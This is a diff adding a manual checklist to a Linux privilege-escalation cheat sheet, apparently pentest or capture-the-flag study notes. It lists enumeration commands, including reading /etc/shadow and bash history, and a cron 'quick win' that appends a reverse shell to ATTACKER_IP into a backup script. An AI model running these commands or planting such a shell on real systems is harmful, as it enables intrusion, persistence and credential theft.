@@ -1,5 +1,28 @@
 # Linux PrivEsc
 
+## Manual Checks:
+
+```
+sudo -l
+find / -perm -4000 -type f 2>/dev/null
+find / -writable -type f 2>/dev/null
+find / -writable -type d 2>/dev/null
+cat /etc/crontab
+crontab -l
+ls -la /etc/cron*
+ps aux
+cat /etc/passwd
+cat /etc/shadow
+cat ~/.bash_history
+uname -a 
+```
+Check to see if you can use dirty cow, gtfo bins, sudo promissions, etc. 
+
+Quick wins with crontab:
+```
+echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /opt/backup.sh
+```
+
 ## Linux Recon script
 This is a bash shell script that does the manual checks for you, not as in-depth, but easier to run. 
 ```
